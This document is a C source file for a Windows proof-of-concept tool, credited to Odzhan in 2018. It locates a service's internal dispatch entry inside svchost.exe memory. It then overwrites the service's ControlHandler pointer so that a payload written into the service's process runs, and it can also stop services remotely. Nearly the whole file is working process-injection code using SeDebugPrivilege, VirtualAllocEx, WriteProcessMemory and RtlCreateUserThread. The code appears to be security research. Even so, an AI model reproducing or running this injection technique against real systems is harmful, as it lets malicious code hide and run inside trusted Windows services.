/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "sc2.h"

DWORD ScanProcessMemory(HANDLE hProcess, PSCAN_DATA p);

// allocate memory
LPVOID xmalloc (SIZE_T dwSize) {
    return HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
}

// re-allocate memory
LPVOID xrealloc (LPVOID lpMem, SIZE_T dwSize) {
    return HeapReAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, lpMem, dwSize);
}

// free memory
VOID xfree (LPVOID lpMem) {
    HeapFree (GetProcessHeap(), 0, lpMem);
}

// display error message for last error code
VOID xstrerror (PWCHAR fmt, ...){
    PWCHAR  error=NULL;
    va_list arglist;
    WCHAR   buffer[1024];
    DWORD   dwError=GetLastError();
    
    va_start(arglist, fmt);
    _vsnwprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
    va_end (arglist);
    
    if (FormatMessage (
          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
          (LPWSTR)&error, 0, NULL))
    {
      wprintf(L"  [ %s : %s\n", buffer, error);
      LocalFree (error);
    } else {
      wprintf(L"  [ %s error : %08lX\n", buffer, dwError);
    }
}

// enable or disable a privilege in current process token
BOOL SetPrivilege(PWCHAR szPrivilege, BOOL bEnable){
    HANDLE           hToken;
    BOOL             bResult;
    LUID             luid;
    TOKEN_PRIVILEGES tp;

    // open token for current process
    bResult = OpenProcessToken(GetCurrentProcess(),
      TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    if(!bResult)return FALSE;
    
    // lookup privilege
    bResult = LookupPrivilegeValueW(NULL, szPrivilege, &luid);
    if(bResult){
      tp.PrivilegeCount           = 1;
      tp.Privileges[0].Luid       = luid;
      tp.Privileges[0].Attributes = bEnable?SE_PRIVILEGE_ENABLED:SE_PRIVILEGE_REMOVED;

      // adjust token
      bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    }
    CloseHandle(hToken);
    return bResult;
}

#if !defined (__GNUC__)
/**
 *
 * Returns TRUE if process token is elevated
 *
 */
BOOL IsElevated(VOID) {
    HANDLE          hToken;
    BOOL            bResult = FALSE;
    TOKEN_ELEVATION te;
    DWORD           dwSize;
      
    if (OpenProcessToken (GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
      if (GetTokenInformation (hToken, TokenElevation, &te,
          sizeof(TOKEN_ELEVATION), &dwSize)) {
        bResult = te.TokenIsElevated;
      }
      CloseHandle(hToken);
    }
    return bResult;
}
#endif

#define ThreadBasicInformation 0

BOOL IsThreadService(PSERVICE_ENTRY se) {
    THREAD_BASIC_INFORMATION   tbi;
    HANDLE                     hThread, hProcess;
    ULONG                      read;
    NTSTATUS                   nt;
    BOOL                       bResult=FALSE;
    DWORD                      i,tag;
    SC_SERVICE_TAG_QUERY       stq;
    DWORD                      res;
    
    NtQueryInformationThread_t pNtQueryInformationThread; 
    NtReadVirtualMemory_t      pNtReadVirtualMemory;
    I_QueryTagInformation_t    pI_QueryTagInformation;
    
    // open process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
    
    // open thread
    hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, se->tid);   
    
    // if both opened
    if(hProcess!=NULL && hThread!=NULL){
      // resolve API
      pNtQueryInformationThread = 
        (NtQueryInformationThread_t)GetProcAddress(LoadLibrary(L"ntdll"),
        "NtQueryInformationThread");   
      
      pNtReadVirtualMemory =
         (NtReadVirtualMemory_t)GetProcAddress(LoadLibrary(L"ntdll"),
         "NtReadVirtualMemory");
        
      // query thread for TEB               
      nt=pNtQueryInformationThread(hThread, 0, &tbi, sizeof(tbi), &read);
      if(nt==0){
        // read SubProcessTag from TEB
        nt=pNtReadVirtualMemory(hProcess, 
            (PVOID)((LPBYTE)tbi.TebBaseAddress + SUBTAG_OFFSET), 
            (PVOID)&tag, sizeof(PVOID), NULL);

        // if not zero
        if (nt==0 && tag!=0){
          // resolve API
          pI_QueryTagInformation = 
            (I_QueryTagInformation_t)GetProcAddress(LoadLibrary(L"advapi32"), 
            "I_QueryTagInformation");
      
          // if ok
          if(pI_QueryTagInformation!=NULL){
            stq.dwProcessId  = se->pid;
            stq.dwServiceTag = tag;
             
            // query tag for service name
            res=pI_QueryTagInformation(NULL, 
                ServiceNameFromTagInformation, &stq);
             
            // query ok?
            if(res==ERROR_SUCCESS){
              // does this match our service?
              bResult=!lstrcmpi((PWCHAR)stq.pszName, se->service);
              LocalFree(stq.pszName);
            } else xstrerror(L"I_QueryTagInformation");
          } else wprintf(L"[-] unable to resolve I_QueryTagInformation.\n");
        }
      } else xstrerror(L"NtQueryInformationThread");
    }
    // close handles
    if(hThread !=NULL)CloseHandle(hThread);
    if(hProcess!=NULL)CloseHandle(hProcess);
    
    return bResult;
}

VOID DumpServiceIDE(PSERVICE_ENTRY se){
    WCHAR  name[MAX_PATH];
    BOOL   bResult;
    DWORD  read;
    HANDLE hProcess;
    
    hProcess=OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
    if(hProcess==NULL){
      xstrerror(L"DumpServiceIDE::OpenProcess");
      return;
    }
    // print the service name       
    bResult=ReadProcessMemory(hProcess, se->ide.ServiceName, name, MAX_PATH, &read);
    wprintf(L"\nServiceName         : %s\n", bResult ? name : L"");
    
    // print the service real name
    bResult=ReadProcessMemory(hProcess, se->ide.ServiceRealName, name, MAX_PATH, &read);
    wprintf(L"ServiceRealName     : %s\n", bResult ? name : L"");
    
    wprintf(L"ServiceStartRoutine : %p\n",  se->ide.ServiceStartRoutine);
    wprintf(L"ControlHandler      : %p\n",  se->ide.ControlHandler);
    wprintf(L"StatusHandle        : %p\n",  se->ide.StatusHandle);
    wprintf(L"ServiceFlags        : %08X\n",se->ide.ServiceFlags);
    wprintf(L"Tag                 : %08X\n",se->ide.Tag);
    wprintf(L"MainThreadHandle    : %p\n\n",se->ide.MainThreadHandle);
    
    CloseHandle(hProcess);
}

BOOL StopService(PSERVICE_ENTRY se){
    DWORD                   evt;
    HANDLE                  hThread, hProcess;
    RtlCreateUserThread_t   pRtlCreateUserThread;
    BOOL                    bResult=FALSE;
    
    wprintf(L"[*] Attempting to stop service...\n");
      
    hProcess=OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
    if(hProcess==NULL){
      xstrerror(L"StopService::OpenProcess");
      return 0;
    }
    // resolve address of RtlCreateUserThread
    // CreateRemoteThread won't work here..
    pRtlCreateUserThread=
      (RtlCreateUserThread_t)GetProcAddress(
      LoadLibrary(L"ntdll"), "RtlCreateUserThread");

    // got it?
    if (pRtlCreateUserThread!=NULL){
      // execute the ControlHandler in remote process space
      pRtlCreateUserThread(hProcess, NULL, FALSE,
          0, NULL, NULL, se->ide.ControlHandler,
          (LPVOID)SERVICE_CONTROL_STOP, &hThread, NULL);

      bResult=(hThread!=NULL);
      // if thread created
      if(bResult){
        // wait 5 seconds for termination
        evt=WaitForSingleObject(hThread, 5*1000);
        bResult=(evt==WAIT_OBJECT_0);
        
        CloseHandle(hThread);
      }
      wprintf(L"[*] Service %s stopped.\n", 
        bResult ? L"successfully" : L"unsuccessfully");
    }
    CloseHandle(hProcess);
    return bResult;
}

VOID FindPointer(HANDLE hProcess, LPVOID ptr, PSERVICE_ENTRY se){
  SCAN_DATA sd;
  union     { BYTE b[8]; ULONG_PTR w; LPVOID p;}x;
  DWORD     e;
  
  ZeroMemory(&sd, sizeof(sd));
  
  // find referenes to the control handler
  x.p = se->ide.ControlHandler;
  
  sd.data = &x;
  sd.len  = sizeof(ULONG_PTR);
  sd.type = SCAN_TYPE_BINARY;
  
  for(;;){
    e=ScanProcessMemory(hProcess, &sd);
    if(e==SCAN_ERROR_END) break;
    wprintf(L"found pointer at %p\n", sd.addr + sd.pos);
  }
}

/**

Once we have IDE, we try open the service via control manager.
*/
BOOL RunPayload(PSERVICE_ENTRY se) {
    DWORD                   es,wr;
    BOOL                    br=FALSE;
    SC_HANDLE               hm, hs;
    INTERNAL_DISPATCH_ENTRY ide;
    HANDLE                  hp,evt;
    LPVOID                  pl;
    SERVICE_STATUS          ss;
    
    wprintf(L"[*] Attempting to inject code into \"%s\"...\n", se->process);
    
    // open the service control manager
    hm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if(hm!=NULL){
      // open target service
      hs = OpenService(hm, se->service, SERVICE_ALL_ACCESS);
      if(hs!=NULL){
        // open target process
        hp=OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
        if(hp!=NULL){
          // allocate memory for payload
          pl=VirtualAllocEx(hp, NULL, PAYLOAD_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          if(pl){
            evt=CreateEvent(NULL,FALSE,FALSE,L"propagate");
            if(evt!=NULL){
              // write payload to process space
              WriteProcessMemory(hp,pl,PAYLOAD,PAYLOAD_SIZE,&wr);
              CopyMemory(&ide, &se->ide, sizeof(ide));
              // point ControlHandler to payload
              ide.ControlHandler=pl;
              // update IDE in remote process
              WriteProcessMemory(hp,se->ide_addr,&ide,sizeof(ide),&wr);
              // find pointer to original ControlHandler
              //FindPointer(hp, pl, se);
              VirtualProtectEx(hp, pl, PAYLOAD_SIZE, PAGE_EXECUTE_READ, &wr);
              wprintf(L"[*] attach debugger and set breakpoint on %p\n", pl);
              getchar();
              // trigger payload
              ControlService(hs,SERVICE_CONTROL_INTERROGATE,&ss);
              xstrerror(L"ControlService");
              // wait for event to signal
              es=WaitForSingleObject(evt, 5*1000);
              // free payload from memory
              VirtualFree(pl,PAYLOAD_SIZE,MEM_RELEASE);
              // restore original IDE
              WriteProcessMemory(hp,se->ide_addr,&se->ide,sizeof(ide),&wr);
              
              CloseHandle(evt);
            }
          }
          CloseHandle(hp);      // close process
        }
        CloseServiceHandle(hs); // close service
      }
      CloseServiceHandle(hm);   // close manager
    }
    return br;
}

// try read an INTERNAL_DISPATCH_ENTRY from pAddr
BOOL ReadServiceIDE(HANDLE hProcess, LPVOID pAddr, PINTERNAL_DISPATCH_ENTRY ide){
    DWORD read;
    BOOL  bResult=FALSE;
    
    // try read an internal dispatch entry from remote process
    if(ReadProcessMemory(hProcess, pAddr, ide, sizeof(INTERNAL_DISPATCH_ENTRY), &read)){
      // if returned length matches
      if(read==sizeof(INTERNAL_DISPATCH_ENTRY)){
        // ensure these values aren't empty
        if(ide->ServiceName         == NULL || 
           ide->ServiceRealName     == NULL ||
           ide->ServiceStartRoutine == NULL ||
           ide->ControlHandler      == NULL) return FALSE;
           
        // check if address of service names are equal
        bResult = (ide->ServiceName == ide->ServiceRealName);
        
        // perform any additional checks here... :P
      }
    }
    return bResult;
}


DWORD ScanProcessMemory(HANDLE hProcess, PSCAN_DATA p) {
    MEMORY_BASIC_INFORMATION mbi;
    PBYTE                    pMemory;
    DWORD                    dwRes;
    BOOL                     bResult,bFound=FALSE;
    SYSTEM_INFO              si;
    
    // get system information
    GetSystemInfo(&si);

    //wprintf(L"position is %ld\n", p->pos);
    
    // if this isn't first call, advance p->pos by one
    if(p->pos != 0 && p->addr!=NULL){
      p->pos++;
    }
    // loop until we find something or run out of memory
    for(;!bFound;){
      // if address equals or exceeds max address, we're done
      if(p->addr >= si.lpMaximumApplicationAddress) 
        return SCAN_ERROR_END;
      
      // query memory for base address
      dwRes=VirtualQueryEx(hProcess, p->addr, &mbi, sizeof(mbi));
      
      // if not correct length returned, bail out
      if(dwRes != sizeof(mbi)) 
        return SCAN_ERROR_QUERY;
      
      // set the base address to scan
      p->addr  = (PBYTE)mbi.BaseAddress;
      // allocate memory for region
      pMemory  = xmalloc(mbi.RegionSize);
      
      // if okay
      if(pMemory != NULL){
        // read memory from process into allocated buffer
        bResult=ReadProcessMemory(hProcess, p->addr, 
            pMemory, mbi.RegionSize, &p->size);
            
        // ok?
        if(bResult){
          // scan memory for data
          for(;!bFound && (p->pos < (p->size - p->len));){
            if(p->type == SCAN_TYPE_STRING){
              // search for string?
              bFound = (StrCmpNI((PWCHAR)&pMemory[p->pos], (PWCHAR)p->data, p->len)==0);
            } else {
              // search for binary
              bFound = (memcmp(&pMemory[p->pos], p->data, p->len)==0);
            }
            if(bFound) {
              break;
            }
            p->pos++;
          }
        }
        xfree(pMemory);
      }
      if(!bFound) {
        // reset position if not found
        p->pos   = 0;
        // advance memory position
        p->addr += mbi.RegionSize;
      }
    }
    return bFound;
}
           
  
BOOL FindServiceIDE(PSERVICE_ENTRY se){
    HANDLE    hProcess;
    BOOL      bFound=FALSE,bResult;
    SCAN_DATA str, ptr;
    DWORD     dwError;
    union     { BYTE b[8]; ULONG_PTR w; LPVOID p;}x;
    
    // try locate the dispatch entry in process by service name
    hProcess=OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
    
    // if process opened
    if(hProcess!=NULL){
      ZeroMemory(&str, sizeof(str));
      
      // set the data to find
      str.data = (LPVOID)se->service;
      str.len  = lstrlen(se->service);
      str.type = SCAN_TYPE_STRING;
       
      // ok, here we go..
      for(;!bFound;){
        // find string in memory
        dwError=ScanProcessMemory(hProcess, &str);
        // end of memory?
        if(dwError==SCAN_ERROR_END||dwError==SCAN_ERROR_QUERY){
          break;
        }
        // found it?
        if(dwError==SCAN_ERROR_FOUND){        
          ZeroMemory(&ptr, sizeof(ptr));
          
          // scan for the string pointer
          x.p=(LPBYTE)str.addr + str.pos;
          
          ptr.data = (LPBYTE)&x;
          ptr.len  = sizeof(ULONG_PTR);
          ptr.type = SCAN_TYPE_BINARY;
          
          // find memory pointer
          for(;!bFound;){
            //wprintf(L"scanning for pointer\n");
            dwError=ScanProcessMemory(hProcess, &ptr);
            // end of memory?
            if(dwError==SCAN_ERROR_END||dwError==SCAN_ERROR_QUERY)break;
            // found pointer?
            if(dwError==SCAN_ERROR_FOUND){
              // is it a dispatch entry?
              bFound=ReadServiceIDE(hProcess, &ptr.addr[ptr.pos], &se->ide);
              if(bFound) {
                // save address
                se->ide_addr = &ptr.addr[ptr.pos];
              }
            }
          }
        }
      }
    }
    return bFound;
}            

BOOL EnumThreads(PSERVICE_ENTRY ste){
    HANDLE                  hSnap;
    THREADENTRY32           te32;
    BOOL                    bResult,bFound=FALSE;
    DWORD                   pid;
    INTERNAL_DISPATCH_ENTRY ide;
    
    // create snapshot of system threads
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return FALSE;
    
    te32.dwSize = sizeof(THREADENTRY32);

    // get first thread
    if(Thread32First(hSnap, &te32)){
      do {
        pid=te32.th32OwnerProcessID;
        // skip System threads
        if(pid <= 4 || pid != ste->pid) continue;
        
        // set thread id
        ste->tid = te32.th32ThreadID;
        
        // check if this thread has tag and service name
        bResult = IsThreadService(ste);
        // if this thread belongs to service
        if(bResult){
          // get the internal dispatch entry
          bFound = FindServiceIDE(ste);
        }
      } while(!bFound && Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);
    
    return bFound;
}
 
/**
  enumerate processes
  for each one found, enumerate threads
*/
BOOL FindService(PSERVICE_ENTRY ste, BOOL bAll) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    BOOL           bFound=FALSE;
    
    // create snapshot of system processes
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return FALSE;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnap, &pe32)){
      do {
        // skip system..
        if(pe32.th32ProcessID<=4) continue;
        // if not all and this isn't svchost.exe, skip it
        if(!bAll && lstrcmpi(pe32.szExeFile, L"svchost.exe")) continue;
          lstrcpyn(ste->process, pe32.szExeFile, MAX_PATH);
          // set process id
          ste->pid = pe32.th32ProcessID;
          // enumerate threads for this process
          bFound=EnumThreads(ste);
      } while(!bFound && Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return bFound;
}

VOID usage(VOID){
    wprintf(L"\nusage: sc2 -[options] <service>\n\n");
    wprintf(L"        -i     : inject payload\n");
    wprintf(L"        -s     : stop service\n");
    wprintf(L"        -a     : search all processes for <service>\n\n");
    exit(0);
}

int main(void) {
    PWCHAR        *argv, service=NULL;
    int           argc, i;
    WCHAR         opt;
    BOOL          bAll=FALSE,bInject=FALSE,bStop=FALSE;
    SERVICE_ENTRY ste;
    
    puts("\nService control Handler PoC\nCopyright(c) 2018 Odzhan\n");
    
    // get parameters
    argv=CommandLineToArgvW(GetCommandLine(), &argc);
    
    for(i=1; i<=argc-1; i++){
      // is this a switch?
      if(argv[i][0]==L'/' || argv[i][0]==L'-'){
        // check it out
        switch(argv[i][1]){
          case L'a':
            bAll=TRUE;
            break;
          case L's':
            bStop=TRUE;
            break;
          case L'i':
            bInject=TRUE;
            break;
          case L'?':
          case L'h':
          default:
            usage();
            break;
        }
      } else if (service==NULL){
        service=argv[i];
      } else {
        usage();
      }
    }
    // if no service, display usage
    if(service==NULL) {
      wprintf(L"[-] No service specified\n");
      usage();
    }
    // if not elevated, display warning
    if(!IsElevated())
      wprintf(L"[-] WARNING: This requires elevated privileges!\n");
    
    // try enable debug privilege
    if(!SetPrivilege(L"SeDebugPrivilege", TRUE)){
      wprintf(L"[-] I'm sorry Dave, I'm afraid I can't do that.\n");
      return 0;
    }
    ZeroMemory(&ste, sizeof(ste));    
    lstrcpyn(ste.service, service, MAX_PATH);
    
    // try find the internal dispatch entry for service
    if(FindService(&ste, bAll)!=0){
      // got it?
      wprintf(L"[+] Found IDE for \"%s\" in %s:%i at address: %p\n", 
        ste.service, ste.process, ste.pid, ste.ide_addr);
      DumpServiceIDE(&ste);
      
      // stop?
      if(bStop){
        StopService(&ste);
      } else if (bInject){
        RunPayload(&ste);
      }
    } else {
      wprintf(L"[-] Unable to find IDE for \"%s\"\n", ste.service);
      wprintf(L"[*] IsServiceThread() sometimes fails to map subsystem tag to service name ;-)\n\n");
    }
    return 0;
}

